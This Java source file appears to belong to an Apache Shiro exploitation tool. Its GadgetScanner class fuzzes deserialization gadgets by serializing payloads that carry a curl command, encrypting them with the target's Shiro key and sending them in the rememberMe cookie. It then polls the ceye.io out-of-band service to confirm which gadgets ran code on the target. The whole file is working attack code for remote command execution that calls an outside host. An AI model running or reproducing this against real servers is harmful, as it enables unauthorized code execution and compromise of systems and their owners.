package core.scan;

import com.alibaba.fastjson.JSONObject;
import core.conn.ShiroHttpConnection;
import core.payload.ObjectPayload;
import core.payload.ScanKey;
import core.scan.eneity.ShiroTarget;
import core.util.ConfigPropertiesReader;
import core.util.Payload;
import core.util.RandomID;
import core.util.Util;

import java.io.InputStream;
import java.util.HashSet;
import java.util.Scanner;
import java.util.Set;

/**
 * To fuzz gadget
 */
public class GadgetScanner implements ShiroScanner {
    /**
     * ceye token
     */
    private final String token = ConfigPropertiesReader.getProp("ceye.token");

    /**
     * ceye identifier
     */
    private final String identifier = ConfigPropertiesReader.getProp("ceye.identifier");

    /**
     * 可用Gadget
     */
    private static final Set<String> UsefulGadget = new HashSet<>();

    private final ShiroTarget target;

    public GadgetScanner(ShiroTarget target) {
        this.target = target;
    }

    @Override
    public void scan() throws Exception {
        String queryTemplate = "curl http://api.ceye.io/v1/records?token=%s&type=http&filter=%s";
        String commandTemplate = "curl %s/%s";

        Set<Class<? extends ObjectPayload>> set = Payload.getAllPayloadClass();
        set.remove(ScanKey.class);
        for (Class<? extends ObjectPayload> payloadClass : set) {
            Util util = new Util();
            ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
            String id = RandomID.randomID();
            String command = String.format(commandTemplate, identifier, id);
            ObjectPayload obj = payloadClass.newInstance();
            System.out.println("[+] Test Gadget: " + payloadClass.getSimpleName());
            Object payload = obj.getObjectPayload(command);
            byte[] serialize = util.serialize(payload);
            String rememberMe = util.getRememberMe(serialize, target.getKey());
            connection.sendRememberMe(rememberMe, false);

            Thread.sleep(500);
            // 客户端执行
            String queryCommand = String.format(queryTemplate, token, id);
            InputStream inputStream = Runtime.getRuntime().exec(queryCommand).getInputStream();
            Scanner scanner = new Scanner(inputStream);
            String queryResult = scanner.hasNextLine() ? scanner.nextLine() : "";
            // parse json
            JSONObject json = JSONObject.parseObject(queryResult);
            if (json.toString().equals("[]")) {
                continue;
            }
            UsefulGadget.add(payloadClass.getSimpleName());
            System.err.println("[*] Found Gadget: " + payloadClass.getSimpleName());
        }

        System.out.println("########Useful Gadget##########");
        UsefulGadget.forEach(System.out::println);
        System.out.println("########Useful Gadget##########");
    }
}
